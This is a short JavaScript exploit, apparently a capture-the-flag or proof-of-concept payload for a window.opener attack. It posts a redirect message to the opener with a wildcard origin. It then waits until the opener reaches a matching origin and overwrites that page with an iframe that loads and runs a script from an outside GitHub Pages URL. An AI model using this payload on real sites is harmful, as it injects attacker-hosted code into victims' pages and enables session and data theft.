if (top.window.opener) {
   // Change this to the full URL pointing to the script2.js file
    var script_url = 'https://abdelfetah18.github.io/js-files/script1.js';

    data = {action:"redirect",url:origin};
    top.window.opener.postMessage(data, '*');

    function sendExploit() {
        clearInterval(checkLocation);
        top.window.opener.document.body.innerHTML = `<iframe srcdoc="sss<script src='${script_url}'></script>"/>`
    }

    checkLocation = setInterval(() => {
        if(top.window.opener.origin == origin){
        sendExploit();
        }
    }, 100);
}